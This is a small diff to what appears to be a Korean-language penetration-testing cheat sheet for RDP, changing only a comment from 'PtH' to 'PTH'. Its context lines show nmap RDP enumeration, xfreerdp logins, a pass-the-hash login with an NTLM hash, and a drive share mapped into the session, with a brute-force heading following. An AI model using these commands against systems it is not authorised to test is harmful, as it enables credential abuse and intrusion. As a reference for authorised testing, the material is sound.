@@ -236,7 +236,7 @@ nmap --script=rdp-enum-encryption,rdp-ntlm-info -p 3389 TARGET
 
 # 접속
 xfreerdp /v:TARGET /u:USER /p:PASS /cert-ignore /dynamic-resolution
-xfreerdp /v:TARGET /u:USER /pth:NTHASH /cert-ignore      # PtH (Restricted Admin)
+xfreerdp /v:TARGET /u:USER /pth:NTHASH /cert-ignore      # PTH (Restricted Admin)
 xfreerdp /v:TARGET /u:USER /p:PASS /cert-ignore +clipboard /drive:share,/tmp
 
 # 브루트포스
